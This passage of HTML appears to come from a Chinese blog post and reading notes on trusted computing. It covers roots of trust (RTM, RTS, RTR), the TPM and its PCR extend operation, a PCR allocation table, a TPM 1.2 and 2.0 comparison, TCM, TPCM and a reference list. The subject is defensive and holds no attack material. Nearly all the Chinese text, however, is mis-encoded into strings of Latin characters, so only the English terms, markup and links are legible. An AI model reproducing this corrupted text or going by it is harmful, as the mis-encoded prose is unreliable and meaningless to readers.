¸ï¼Œå¹¶å¯¹å…¶è¿›è¡Œæµ‹é‡å’ŒéªŒè¯ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šæ¯”å¦‚ï¼Œå¸¸è§çš„åŠ è½½å™¨å¦‚GRUBæˆ–Windows Boot Managerä¼šè¢«æµ‹é‡ï¼Œä»¥ç¡®ä¿æœªè¢«ç¯¡æ”¹ã€‚</li><li><strong>è¾“å‡º</strong>ï¼šå°†æµ‹é‡ç»“æœå­˜å‚¨åœ¨TPMä¸­ï¼Œä½œä¸ºåç»­éªŒè¯çš„åŸºç¡€ã€‚</li></ul><p><strong>OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰</strong></p><ul><li><strong>ä½œç”¨</strong>ï¼šåœ¨åŠ è½½å¹¶å®Œæˆè‡ªæ£€åï¼Œæ“ä½œç³»ç»Ÿä¼šç»§ç»­æµ‹é‡å…³é”®ç»„ä»¶ï¼ˆå¦‚å†…æ ¸æ¨¡å—ã€é…ç½®æ–‡ä»¶ï¼‰ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šæ“ä½œç³»ç»Ÿè¿˜å¯ä»¥è°ƒç”¨TPMéªŒè¯å‰é¢é˜¶æ®µçš„å¯ä¿¡çŠ¶æ€ï¼Œä»¥ç¡®ä¿æ•´ä¸ªé“¾æ¡çš„å®Œæ•´æ€§ã€‚</li></ul><p><strong>Applicationsï¼ˆåº”ç”¨ç¨‹åºï¼‰</strong></p><ul><li><strong>ä½œç”¨</strong>ï¼šæŸäº›å…³é”®åº”ç”¨ç¨‹åºï¼ˆå¦‚å®‰å…¨è½¯ä»¶ã€åŠ å¯†æ¨¡å—ï¼‰ä¹Ÿå¯ä»¥åŸºäºæ“ä½œç³»ç»Ÿçš„ä¿¡ä»»é“¾ï¼Œå¯¹è‡ªèº«æˆ–å…¶ä»–åº”ç”¨è¿›è¡Œåº¦é‡å’ŒéªŒè¯ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šè¿™éƒ¨åˆ†é€šå¸¸ç”±å…·ä½“çš„åº”ç”¨åœºæ™¯å†³å®šï¼Œæ¯”å¦‚åœ¨äº‘è®¡ç®—ä¸­ï¼Œè™šæ‹Ÿæœºç®¡ç†ç¨‹åºï¼ˆHypervisorï¼‰å¯èƒ½ä¼šæˆä¸ºé¢å¤–çš„ä¸€ç¯ã€‚</li></ul><h1 id="ä¿¡ä»»æ ¹">ä¿¡ä»»æ ¹</h1><p>TCGï¼ˆTrusted Computing Groupï¼‰å®šä¹‰çš„ä¿¡ä»»æ ¹ï¼ˆRoot of Trust, RoTï¼‰ æ˜¯æŒ‡åœ¨è®¡ç®—æœºç³»ç»Ÿæˆ–è®¾å¤‡ä¸­ï¼Œç”¨äºæ”¯æŒå®‰å…¨æ“ä½œçš„ä¸€ä¸ªå¯ä¿¡èµ–çš„ç¡¬ä»¶æˆ–è½¯ä»¶åŸºç¡€ã€‚å®ƒæ˜¯ç³»ç»Ÿå¯ä¿¡è®¡ç®—çš„åŸºç¡€ï¼Œæä¾›äº†ä¸€ç»„æ ¸å¿ƒåŠŸèƒ½ï¼Œå¸®åŠ©éªŒè¯å’Œä¿æŠ¤ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼Œæ¯ä¸ªç»„ä»¶å…·æœ‰ç‰¹å®šçš„åŠŸèƒ½ï¼Œæ˜¯å»ºç«‹å¯ä¿¡è®¡ç®—ç¯å¢ƒçš„åŸºç¡€ï¼š</p><h2 id="å¯ä¿¡åº¦é‡æ ¹ï¼ˆRTMï¼‰">å¯ä¿¡åº¦é‡æ ¹ï¼ˆRTMï¼‰</h2><ul><li><strong>å…¨ç§°</strong>ï¼šRoot of Trust for Measurement</li><li><strong>åŠŸèƒ½</strong>ï¼šè´Ÿè´£å¯¹ç³»ç»Ÿå…³é”®ç»„ä»¶å’Œå¯åŠ¨ä»£ç è¿›è¡Œæµ‹é‡ï¼ˆé€šå¸¸æŒ‡å“ˆå¸Œè®¡ç®—ï¼‰ï¼Œç”Ÿæˆç”¨äºéªŒè¯çš„å¯ä¿¡åº¦é‡å€¼ã€‚è¿™æ˜¯å¯ä¿¡é“¾çš„èµ·ç‚¹ï¼Œé€šå¸¸åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ç”±å›ºä»¶æˆ–ç¡¬ä»¶å®ç°ã€‚</li></ul><h2 id="å¯ä¿¡å­˜å‚¨æ ¹ï¼ˆRTSï¼‰">å¯ä¿¡å­˜å‚¨æ ¹ï¼ˆRTSï¼‰</h2><ul><li><strong>å…¨ç§°</strong>ï¼šRoot of Trust for Storage</li><li><strong>åŠŸèƒ½</strong>ï¼šç”¨äºå®‰å…¨å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†é’¥ã€åº¦é‡å€¼å’Œé…ç½®æ•°æ®ã€‚å®ƒé€šå¸¸ä¾èµ–äºç¡¬ä»¶æ¨¡å—ï¼ˆå¦‚TPMï¼‰æ¥ä¿æŠ¤è¿™äº›æ•°æ®å…å—ç¯¡æ”¹æˆ–æœªæˆæƒè®¿é—®ã€‚</li></ul><h2 id="å¯ä¿¡æŠ¥å‘Šæ ¹ï¼ˆRTRï¼‰">å¯ä¿¡æŠ¥å‘Šæ ¹ï¼ˆRTRï¼‰</h2><ul><li><strong>å…¨ç§°</strong>ï¼šRoot of Trust for Reporting</li><li><strong>åŠŸèƒ½</strong>ï¼šè´Ÿè´£å®‰å…¨æŠ¥å‘Šç³»ç»ŸçŠ¶æ€å’Œåº¦é‡å€¼ï¼Œç¡®ä¿è¿™äº›æ•°æ®çš„çœŸå®æ€§å’Œå®Œæ•´æ€§ï¼Œç”¨äºå‘å¤–éƒ¨éªŒè¯æ–¹è¯æ˜è®¾å¤‡æˆ–å¹³å°çš„å¯ä¿¡çŠ¶æ€ã€‚</li></ul><h2 id="æ‰“ä¸ªæ¯”æ–¹">æ‰“ä¸ªæ¯”æ–¹</h2><p>è¿™æ ·è¯´èµ·æ¥æ¯”è¾ƒæŠ½è±¡ï¼Œç†è§£æ¯”è¾ƒå›°éš¾ï¼Œä½†å®é™…ä¸Šè¿™ä¹ˆåˆ†å¾ˆæ¸…æ™°ã€‚</p><p>æƒ³è±¡ä½ çš„ç”µè„‘æ˜¯ä¸€ä¸ªâ€œä¿é™©ç®±â€ï¼Œä¿¡ä»»æ ¹å°±æ˜¯è´Ÿè´£ç¡®ä¿è¿™ä¸ªâ€œä¿é™©ç®±â€è¶³å¤Ÿå®‰å…¨çš„éƒ¨åˆ†</p><ul><li><strong>RTMï¼ˆå¯ä¿¡åº¦é‡æ ¹ï¼‰</strong>ï¼šå¥½æ¯”ä¸€ä¸ªâ€œå®‰æ£€ä»ªå™¨â€ï¼Œæ¯æ¬¡ä½ å¯åŠ¨ä¿é™©ç®±æ—¶ï¼Œå®ƒä¼šæ‰«ææ£€æŸ¥é”ã€é—¨å’Œå¯†ç ç³»ç»Ÿæœ‰æ²¡æœ‰è¢«æ”¹åŠ¨ã€‚</li><li><strong>RTSï¼ˆå¯ä¿¡å­˜å‚¨æ ¹ï¼‰</strong>ï¼šå°±åƒä¿é™©ç®±é‡Œçš„â€œç§˜å¯†éš”é—´â€ï¼Œé‡Œé¢æ”¾ç€ä½ çš„é‡è¦æ–‡ä»¶ï¼ˆå¯†é’¥ã€å¯†ç ç­‰ï¼‰ï¼Œç¡®ä¿æ²¡æœ‰äººèƒ½å·èµ°æˆ–ç¯¡æ”¹è¿™äº›æ–‡ä»¶ã€‚</li><li><strong>RTRï¼ˆæŠ¥å¯ä¿¡æŠ¥å‘Šæ ¹ï¼‰</strong>ï¼šåƒä¸€ä¸ªâ€œæŠ¥è­¦å™¨â€ï¼Œå½“æœ‰äººè¯•å›¾æ‰“å¼€ä½ çš„ä¿é™©ç®±æ—¶ï¼Œå®ƒä¼šå‘Šè¯‰ä½ ï¼ˆæˆ–åˆ«äººï¼‰å½“å‰ä¿é™©ç®±æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦è¢«åŠ¨è¿‡æ‰‹è„šã€‚</li></ul><h1 id="å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTPMï¼‰">å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTPMï¼‰</h1><p>**å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTrusted Platform Module, TPMï¼‰**æ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„ä¿¡ä»»æ ¹ï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèŠ¯ç‰‡ï¼ˆå¾®æ§åˆ¶å™¨ï¼‰ã€‚è¯¥èŠ¯ç‰‡çš„è§„æ ¼ç”±å¯ä¿¡è®¡ç®—ç»„ï¼ˆTrusted Computing Groupï¼‰æ¥åˆ¶å®šã€‚</p><h2 id="TPMçš„ç»„ä»¶">TPMçš„ç»„ä»¶</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/4B9C7BAD-1D09-3519-AD3C14521816BC05.jpg" alt="4B9C7BAD-1D09-3519-AD3C14521816BC05"></p><h2 id="TPM-2-0å†…éƒ¨ç»“æ„åŠæ¨¡å—åŠŸèƒ½">TPM 2.0å†…éƒ¨ç»“æ„åŠæ¨¡å—åŠŸèƒ½</h2><p>TCGå…ˆåå‘å¸ƒè¿‡å¤šä¸ªç‰ˆæœ¬çš„TPMæ ‡å‡†ï¼Œå…¶ä¸­ï¼ŒTPM 1.2ä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œä½†éšç€ä¿¡æ¯è®¡ç®—æœºæŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼ŒTPM 1.2æ— æ³•æ»¡è¶³æ–°æŠ€æœ¯ä¸‹çš„éœ€æ±‚ï¼Œ2014 TCGå‘å¸ƒäº†TPM 2.0ï¼ŒTPM 2.0å†…éƒ¨ç»“æ„åŠæ¨¡å—åŠŸèƒ½å¦‚ä¸‹å›¾ï¼š<br><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241120102508022.png" alt="image-20241120102508022"></p><h2 id="å¹³å°é…ç½®å¯„å­˜å™¨ï¼ˆPCRï¼‰">å¹³å°é…ç½®å¯„å­˜å™¨ï¼ˆPCRï¼‰</h2><p>**å¹³å°é…ç½®å¯„å­˜å™¨ï¼ˆPlatform Configuration Register, PCRï¼‰**æ˜¯TPMèŠ¯ç‰‡çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ä¹‹ä¸€ï¼Œå®ƒçš„ä¸»è¦ç”¨é€”æ˜¯æä¾›ä¸€ç§åŸºäºå¯†ç å­¦çš„åº¦é‡è½¯ä»¶çŠ¶æ€çš„æ–¹æ³•ï¼Œåº¦é‡å¯¹è±¡åŒ…æ‹¬å¹³å°ä¸Šè¿è¡Œçš„è½¯ä»¶å’Œè¯¥è½¯ä»¶ä½¿ç”¨çš„é…ç½®æ•°æ®ã€‚</p><p>TPMåœ¨ä¸Šç”µæ—¶ä¼šå°†æ‰€æœ‰PCRåˆå§‹åŒ–ä¸ºå…¨0æˆ–å…¨1ï¼ˆæ ¹æ®TPMå¹³å°è§„å®šçš„åˆå§‹çŠ¶æ€ï¼‰ï¼Œè°ƒç”¨è€…ä¸èƒ½ç›´æ¥å†™PCRï¼Œåªèƒ½é€šè¿‡è¢«ç§°ä¸º**â€œæ‰©å±•â€ï¼ˆExtendï¼‰**çš„æ“ä½œæ›´æ–°PCRçš„å€¼ï¼Œè¿™æ˜¯ä¸€ç§å•å‘å“ˆå¸Œè®¡ç®—ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mi>n</mi><mi>e</mi><mi>w</mi></mrow></msub><mo>=</mo><mi>h</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mi>R</mi><mi mathvariant="normal">âˆ£</mi><mi mathvariant="normal">âˆ£</mi><mtext>æ‰©å±•æ•°æ®</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">PCR_{new}=hash(PCR||æ‰©å±•æ•°æ®)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ha</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">PCR</span><span class="mord">âˆ£âˆ£</span><span class="mord cjk_fallback">æ‰©å±•æ•°æ®</span><span class="mclose">)</span></span></span></span></span></p><p>å…¸å‹çš„PCRåˆ†é…å¦‚ä¸‹ï¼š</p><table><thead><tr><th>PCRç¼–å·</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>0</td><td>BIOS</td></tr><tr><td>1</td><td>BIOSé…ç½®</td></tr><tr><td>2</td><td>å¯é€‰ROM</td></tr><tr><td>3</td><td>å¯é€‰ROMé…ç½®</td></tr><tr><td>4</td><td>MBR</td></tr><tr><td>5</td><td>MBRé…ç½®</td></tr><tr><td>6</td><td>çŠ¶æ€è½¬å˜å’Œå”¤é†’äº‹ä»¶</td></tr><tr><td>7</td><td>å¹³å°åˆ¶é€ å•†ç‰¹å®šåº¦é‡</td></tr><tr><td>8-15</td><td>é™æ€æ“ä½œç³»ç»Ÿ</td></tr><tr><td>16</td><td>Debug</td></tr><tr><td>23</td><td>åº”ç”¨ç¨‹åºæ”¯æŒ</td></tr></tbody></table><h2 id="TPM1-2ä¸2-0å¯¹æ¯”">TPM1.2ä¸2.0å¯¹æ¯”</h2><table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>TPM 1.2</th><th>TPM 2.0</th></tr></thead><tbody><tr><td>å¹³å°æ”¯æŒ</td><td>ä¸»è¦é¢å‘PCå¹³å°è®¾è®¡ï¼Œä¸é€‚åˆæœåŠ¡å™¨å¹³å°å’ŒåµŒå…¥å¼å¹³å°</td><td>é¢å‘å¤šå¹³å°</td></tr><tr><td>æœ¬åœ°åŒ–</td><td>å¯†ç æ–¹æ¡ˆä¸æ”¯æŒæœ¬åœ°åŒ–ï¼Œä¸åˆ©äºå‘ä¸–ç•Œå„å›½æ¨å¹¿</td><td>æ”¯æŒä¸åŒå›½å®¶ä½¿ç”¨è‡ªå·±çš„æ ‡å‡†<a href="https://zhida.zhihu.com/search?content_id=227470635&amp;content_type=Article&amp;match_order=1&amp;q=%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95&amp;zhida_source=entity">å¯†ç ç®—æ³•</a>ï¼Œä¾‹å¦‚æˆ‘å›½çš„TPM 2.0èŠ¯ç‰‡æ”¯æŒSM2ã€SM3å’ŒSM4å›½å¯†ç®—æ³•</td></tr><tr><td>PCR</td><td>åªèƒ½ä½¿ç”¨SHA-1ç®—æ³•è¿›è¡ŒPCRæ‰©å±•</td><td>æ‹¥æœ‰å¤šä¸ªPCR banksï¼Œä¸€ä¸ªbankå†…æ‰€æœ‰PCRä½¿ç”¨ç›¸åŒç®—æ³•è¿›è¡Œæ‰©å±•æ“ä½œï¼Œå¯¹äºä¸åŒçš„bankï¼Œæ‰©å±•æ“ä½œç›¸äº’ç‹¬ç«‹ï¼Œäº’ä¸å¹²æ‰°</td></tr></tbody></table><h1 id="å¯ä¿¡å¯†ç æ¨¡å—ï¼ˆTCMï¼‰">å¯ä¿¡å¯†ç æ¨¡å—ï¼ˆTCMï¼‰</h1><p>**å¯ä¿¡å¯†ç æ¨¡å—ï¼ˆtrusted cryptography module,TCMï¼‰**æ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„ç¡¬ä»¶æ¨¡å—ï¼Œä¸ºå¯ä¿¡è®¡ç®—å¹³å°æä¾›å¯†ç è¿ç®—åŠŸèƒ½ï¼Œå…·æœ‰å—ä¿æŠ¤çš„å­˜å‚¨ç©ºé—´ï¼Œæ˜¯æˆ‘å›½å›½å†…ç ”ç©¶ï¼Œä¸TPMå¯¹åº”ã€‚ä½†å®šä½ä¸åŒï¼ŒTCGç»„ç»‡å°†TPMå®šä½ä¸ºç³»ç»Ÿçš„å¯ä¿¡æ ¹ã€‚ä½†æ˜¯TCMå®šä½ä¸ºå¯ä¿¡å¹³å°ä¸­ä¸“ç”¨äºæä¾›å¯ä¿¡å¯†ç æœåŠ¡çš„æ¨¡å—ï¼Œæ˜¯å¯ä¿¡æ ¹çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚</p><h2 id="ç»“æ„ä¸åŠŸèƒ½">ç»“æ„ä¸åŠŸèƒ½</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241120111814500.png" alt="image-20241120111814500"></p><h1 id="å¯ä¿¡å¹³å°æ§åˆ¶æ¨¡å—-TPCM">å¯ä¿¡å¹³å°æ§åˆ¶æ¨¡å—(TPCM)</h1><h2 id="åŠŸèƒ½æè¿°">åŠŸèƒ½æè¿°</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241120112236449.png" alt="image-20241120112236449"></p><h1 id="å¯ä¿¡è½¯ä»¶æ ˆï¼ˆTSSï¼‰">å¯ä¿¡è½¯ä»¶æ ˆï¼ˆTSSï¼‰</h1><h1 id="å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</h1><p>[1] <a href="https://blog.csdn.net/qq_35481726/article/details/124704377">ã€å¯ä¿¡è®¡ç®—ã€‘ç¬¬äº”æ¬¡è¯¾ï¼šå¯ä¿¡è®¡ç®—è§„èŒƒä¸æ ‡å‡†_tpm2 éšç§åŸŸ-CSDNåšå®¢</a></p><p>[2] <a href="https://www.sohu.com/a/256818986_653604/">ç½‘ç»œå®‰å…¨ä¹‹å¯ä¿¡è®¡ç®—_è®¡ç®—æœº</a></p><p>[3] <a href="https://blog.csdn.net/xy010902100449/article/details/122286055">çœ‹è§â€œä¿¡ä»»â€ï¼Œå¯ä¿¡è®¡ç®—å¹³å°çš„ç”±æ¥è§£è¯»ï¼ˆTPMã€TCMã€TPCMã€ç­‰ä¿2.0è§£è¯»ï¼‰ã€‚-CSDNåšå®¢</a></p><p>[4] <a href="https://blog.csdn.net/xiaoju14/article/details/109717146">TCMã€TPMã€TPCM-CSDNåšå®¢</a></p><p>[5] <a href="https://zhuanlan.zhihu.com/p/627026294">å¯ä¿¡è®¡ç®—çš„å‰ä¸–ä»Šç”Ÿ - çŸ¥ä¹</a></p><p>[6] [å¯ä¿¡å¹³å°æ§åˆ¶æ¨¡å—ï¼ˆTPCMï¼‰ | openEuleræ–‡æ¡£ | openEulerç¤¾åŒº | v24.09](<a href="https://docs.openeuler.org/zh/docs/24.09/docs/Administration/%E5%8F%AF%E4%BF%A1%E5%B9%B3%E5%8F%B0%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9D%97TPCM.html#:~:text=%E5%8F%AF%E4%BF%A1%E5%B9%B3%E5%8F%B0%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9D%97%EF%BC%88Trusted">https://docs.openeuler.org/zh/docs/24.09/docs/Administration/å¯ä¿¡å¹³å°æ§åˆ¶æ¨¡å—TPCM.html#:~:text=å¯ä¿¡å¹³å°æ§åˆ¶æ¨¡å—ï¼ˆTrusted</a> Platform,Control Moduleï¼ŒTPCMï¼‰æ˜¯ä¸€ç§å¯é›†æˆåœ¨å¯ä¿¡è®¡ç®—å¹³å°ä¸­ï¼Œç”¨äºå»ºç«‹å’Œä¿éšœä¿¡ä»»æºç‚¹çš„åŸºç¡€æ ¸å¿ƒæ¨¡å—ã€‚ å®ƒä½œä¸ºä¸­å›½å¯ä¿¡è®¡ç®—3.0ä¸­çš„åˆ›æ–°ç‚¹ä¹‹ä¸€å’Œä¸»åŠ¨å…ç–«æœºåˆ¶çš„æ ¸å¿ƒï¼Œå®ç°äº†å¯¹æ•´ä¸ªå¹³å°çš„ä¸»åŠ¨å¯æ§ã€‚)</p><p>[7] <a href="https://trustedcomputinggroup.org/resource/trusted-platform-module-tpm-summary/">å¯ä¿¡å¹³å°æ¨¡å— ï¼ˆTPMï¼‰ æ‘˜è¦ |å¯ä¿¡è®¡ç®—ç»„</a></p><p>æ³¨ï¼šéƒ¨åˆ†å›¾ç‰‡æ¥æºäºç½‘ç»œï¼Œå¦‚æœ‰ä¾µæƒè¯·é‚®ç®±è”ç³»ã€‚</p><h1 id="å¯ä¿¡è®¡ç®—ä¹¦ç±é˜…è¯»ç¬”è®°">å¯ä¿¡è®¡ç®—ä¹¦ç±é˜…è¯»ç¬”è®°</h1><h1 id="å¯ä¿¡è®¡ç®—ç†è®ºä¸æŠ€æœ¯">å¯ä¿¡è®¡ç®—ç†è®ºä¸æŠ€æœ¯</h1><p>æœ¬ç« ä¸ºé˜…è¯»ã€Šå¯ä¿¡è®¡ç®—ç†è®ºä¸æŠ€æœ¯ã€‹çš„é˜…è¯»ç¬”è®°ã€‚</p><h2 id="å¯ä¿¡è®¡ç®—æŠ€æœ¯">å¯ä¿¡è®¡ç®—æŠ€æœ¯</h2><h3 id="å¯ä¿¡è®¡ç®—æ¦‚è®º">å¯ä¿¡è®¡ç®—æ¦‚è®º</h3><h4 id="åˆè¯†å¯ä¿¡è®¡ç®—">åˆè¯†å¯ä¿¡è®¡ç®—</h4><p>å¯ä¿¡è®¡ç®—çš„æ ¸å¿ƒå°±æ˜¯è¦å»ºç«‹ä¸€ç§ä¿¡ä»»æœºåˆ¶ï¼Œç”¨æˆ·ä¿¡ä»»è®¡ç®—æœºï¼Œè®¡ç®—æœºä¿¡ä»»ç”¨æˆ·ï¼Œç”¨æˆ·åœ¨æ“ä½œè®¡ç®—æœºæ—¶éœ€è¦è¯æ˜è‡ªå·±çš„èº«ä»½ï¼Œè®¡ç®—æœºåœ¨ä¸ºç”¨æˆ·æœåŠ¡æ—¶ä¹Ÿè¦éªŒè¯ç”¨æˆ·çš„èº«ä»½ã€‚è¿™æ ·ä¸€ç§ç†å¿µæ¥è‡ªäºäººä»¬æ‰€å¤„çš„ç¤¾ä¼šç”Ÿæ´»ã€‚</p><p>è¿‘å¹´æ¥ï¼Œä½“ç°æ•´ä½“å®‰å…¨çš„å¯ä¿¡è®¡ç®—æŠ€æœ¯è¶Šæ¥è¶Šå—åˆ°äººä»¬çš„å…³æ³¨ï¼Œè¿™æ­£æ˜¯å› ä¸ºå®ƒæœ‰åˆ«äºä¼ ç»Ÿçš„å®‰å…¨æŠ€æœ¯ï¼Œè¯•å›¾ä»æ ¹æœ¬ä¸Šè§£å†³å®‰å…¨é—®é¢˜ã€‚</p><h4 id="å¯ä¿¡è®¡ç®—å®šä¹‰ä¸å…³é”®æŠ€æœ¯">å¯ä¿¡è®¡ç®—å®šä¹‰ä¸å…³é”®æŠ€æœ¯</h4><p>å¯ä¿¡è®¡ç®—çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼š</p><ol><li><p>å¯ä¿¡è®¡ç®—åŸº</p><p>å¯ä¿¡è®¡ç®—åŸºï¼ˆ<code>TCB</code>ï¼ŒTrusted Computing Baseï¼‰æ˜¯è®¡ç®—æœºç³»ç»Ÿå†…ä¿æŠ¤è£…ç½®çš„æ€»ä½“ï¼ŒåŒ…æ‹¬ç¡¬ä»¶ã€å›ºä»¶ã€è½¯ä»¶å’Œè´Ÿè´£æ‰§è¡Œå®‰å…¨ç­–ç•¥çš„ç»„åˆä½“ã€‚é€šå¸¸æ‰€æŒ‡çš„<code>TCB</code>æ˜¯æ„æˆå®‰å…¨è®¡ç®—æœºä¿¡æ¯ç³»ç»Ÿçš„æ‰€æœ‰å®‰å…¨ä¿æŠ¤è£…ç½®çš„ç»„åˆä½“ï¼ˆé€šå¸¸ç§°ä¸ºå®‰å…¨å­ç³»ç»Ÿï¼‰ï¼Œä»¥é˜²æ­¢ä¸å¯ä¿¡ä¸»ä½“çš„å¹²æ‰°å’Œç¯¡æ”¹ã€‚</p></li><li><p>å¯ä¿¡è®¡ç®—å¹³å°</p><p>å¹³å°æ˜¯ä¸€ç§èƒ½å‘ç”¨æˆ·å‘å¸ƒä¿¡æ¯æˆ–ä»ç”¨æˆ·é‚£é‡Œæ¥æ”¶ä¿¡æ¯çš„å®ä½“ã€‚å¯ä¿¡è®¡ç®—å¹³å°åŸºäº<code>TPM</code>ï¼Œä»¥å¯†ç æŠ€æœ¯ä¸ºæ”¯æŒã€å®‰å…¨æ“ä½œç³»ç»Ÿä¸ºæ ¸å¿ƒã€‚å®‰å…¨æ“ä½œç³»ç»Ÿæ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„æ ¸å¿ƒå’ŒåŸºç¡€ï¼Œæ²¡æœ‰å®‰å…¨çš„æ“ä½œç³»ç»Ÿï¼Œå°±æ²¡æœ‰å®‰å…¨çš„åº”ç”¨ï¼Œä¹Ÿä¸èƒ½ä½¿<code>TPM</code>å‘æŒ¥åº”æœ‰çš„ä½œç”¨ã€‚</p></li><li><p>å¯ä¿¡æ ¹å’Œå¯ä¿¡é“¾</p><p>å¯ä¿¡æ ¹å’Œä¿¡ä»»é“¾æ˜¯å¯ä¿¡è®¡ç®—å¹³å°çš„æ ¸å¿ƒå…³é”®æŠ€æœ¯ã€‚ä¸€ä¸ªå¯ä¿¡è®¡ç®—æœºç³»ç»Ÿç”±å¯ä¿¡æ ¹ã€å¯ä¿¡ç¡¬ä»¶å¹³å°ã€å¯ä¿¡æ“ä½œç³»ç»Ÿå’Œå¯ä¿¡åº”ç”¨ç»„æˆã€‚ä¿¡ä»»é“¾æ˜¯é€šè¿‡æ„å»ºä¸€ä¸ªå¯ä¿¡æ ¹ï¼Œä»å¯ä¿¡æ ¹å¼€å§‹åˆ°ç¡¬ä»¶å¹³å°ã€åˆ°æ“ä½œç³»ç»Ÿã€å†åˆ°åº”ç”¨ï¼Œä¸€çº§è®¤è¯ä¸€çº§ï¼Œä¸€çº§ä¿¡ä»»ä¸€çº§ï¼Œä»è€ŒæŠŠè¿™ç§ä¿¡ä»»æ‰©å±•åˆ°æ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼Œå¯ä¿¡æ ¹çš„å¯ä¿¡æ€§ç”±ç‰©ç†å®‰å…¨å’Œç®¡ç†å®‰å…¨ç¡®ä¿ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241126211348243.png" alt="image-20241126211348243"></p></li></ol><p><strong>å¯ä¿¡è®¡ç®—çš„å®šä¹‰ä¸åŸç†</strong></p><ul><li><p>å¯ä¿¡è®¡ç®—çš„å®šä¹‰ï¼š</p><p>å¯ä¿¡è®¡ç®—å­¦æœ¯ç•Œå¯¹å¯ä¿¡çš„ç»Ÿä¸€è®¤è¯†ä¸ºï¼šå¯ä¿¡è®¡ç®—æ˜¯æŒ‡è®¡ç®—çš„åŒæ—¶è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼Œä½¿è®¡ç®—ç»“æœæ€»æ˜¯ä¸é¢„æœŸä¸€æ ·ï¼Œè®¡ç®—å…¨ç¨‹å¯æµ‹å¯æ§ï¼Œä¸è¢«å¹²æ‰°ã€‚</p></li><li><p>å¯ä¿¡è®¡ç®—çš„åŸç†</p><p>å¯ä¿¡è®¡ç®—çš„åŸç†æ˜¯é€šè¿‡ç¡¬ä»¶å¯ä¿¡æ ¹å¯¹ç³»ç»Ÿçš„å¯åŠ¨å’Œè¿è¡ŒçŠ¶æ€è¿›è¡Œåº¦é‡å’ŒéªŒè¯ï¼Œå½¢æˆä¸€æ¡å®Œæ•´çš„ä¿¡ä»»é“¾ï¼Œä»¥ç¡®ä¿ç³»ç»Ÿå¤„äºå¯éªŒè¯çš„å¯ä¿¡çŠ¶æ€ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241126204237201.png" alt="image-20241126204237201"></p></li></ul><p><strong>å¯ä¿¡è®¡ç®—æŠ€æœ¯ä½“ç³»</strong></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241126211726702.png" alt="image-20241126211726702"></p><ul><li><p>å¯ä¿¡æ ¹ï¼ˆRoot of 